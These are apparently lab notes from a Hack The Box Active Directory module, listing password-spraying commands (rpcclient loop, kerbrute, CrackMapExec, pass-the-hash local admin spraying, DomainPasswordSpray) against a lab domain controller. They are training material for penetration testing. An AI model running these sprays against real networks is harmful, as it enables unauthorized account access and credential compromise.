#### Using a Bash one-liner for the Attack

```shell-session
for u in $(cat /opt/jsmith.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```
#### Using Kerbrute for the Attack
```shell-session
Tachipy@htb[/htb]$ kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 ./user.list Welcome1
```
#### Using CrackMapExec & Filtering Logon Failures
```shell-session
Tachipy@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u /opt/jsmith.txt -p Password123 | grep +
```
#### Validating the Credentials with CrackMapExec
```shell-session
Tachipy@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123
```
#### Local Admin Spraying with CrackMapExec
```shell-session
Tachipy@htb[/htb]$ sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```

### Password Spraying from Windows Host
```powershell-session
PS C:\htb> Import-Module .\DomainPasswordSpray.ps1
PS C:\htb> Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```
